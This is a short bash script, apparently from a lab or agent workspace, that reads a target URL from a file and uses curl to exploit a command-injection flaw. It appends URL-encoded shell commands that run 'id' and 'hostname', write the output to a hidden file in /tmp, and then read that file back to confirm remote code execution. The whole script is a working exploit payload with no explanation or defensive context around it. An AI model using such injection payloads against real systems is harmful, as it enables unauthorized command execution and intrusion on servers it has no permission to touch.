#!/bin/bash
url=$(cat /workspace/url.txt)
curl -s "${url};id%20%26%26%20hostname%20%3E%20/tmp/.rex_ci_edge"
curl -s "${url};cat%20/tmp/.rex_ci_edge"
